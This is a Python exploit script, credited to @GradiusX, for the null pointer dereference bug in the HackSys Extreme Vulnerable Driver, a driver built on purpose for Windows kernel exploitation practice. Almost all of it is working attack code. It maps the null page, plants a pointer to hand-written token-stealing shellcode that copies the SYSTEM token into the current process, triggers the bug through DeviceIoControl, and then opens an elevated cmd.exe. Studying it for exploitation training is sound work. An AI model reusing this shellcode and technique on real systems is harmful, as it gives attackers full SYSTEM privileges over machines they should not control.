import ctypes, struct, sys, os, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\xC3"                      # ret
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address
		
def NtAllocateVirtualMemory_shellcode_ptr():
	base_address = c_void_p(0x1)
	null_size = c_int(2048)
	nt_result = ntdll.NtAllocateVirtualMemory(kernel32.GetCurrentProcess(), byref(base_address), 0, byref(null_size), win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
	shellcode_ptr = heap_alloc_payload()
	csrc = create_string_buffer(struct.pack("<L",shellcode_ptr), 0x4)
	memmove_result = ctypes.memmove(0x4, addressof(csrc), 0x4)
	print "[+] Copying shellcode pointer (0x%X) to address 0x%X" % (shellcode_ptr,memmove_result)
	print "[+] NtAllocateVirtualMemory Status: %s" % nt_result
	print "[+] memmove Status: %s" % memmove_result

	
def trigger_nullpointer_dereference():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
			
	NtAllocateVirtualMemory_shellcode_ptr()
			
	magicvalue = struct.pack("<L", 0xBAD0B0B1) #as long as it's not 0xBAD0B0B0
	magicvalue_size  = len(magicvalue)
	magicvalue_ptr = id(magicvalue) + 20
	dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x22202B, magicvalue_ptr, magicvalue_size, None, 0,byref(dwReturn), None)
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[-] Exploit did not work. Re-run it!"
	
	
def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Null Pointer Dereference"
	print "Author: @GradiusX"
	print "\r\n"
	
	
	
if __name__ == '__main__':
	preamble()
	trigger_nullpointer_dereference()
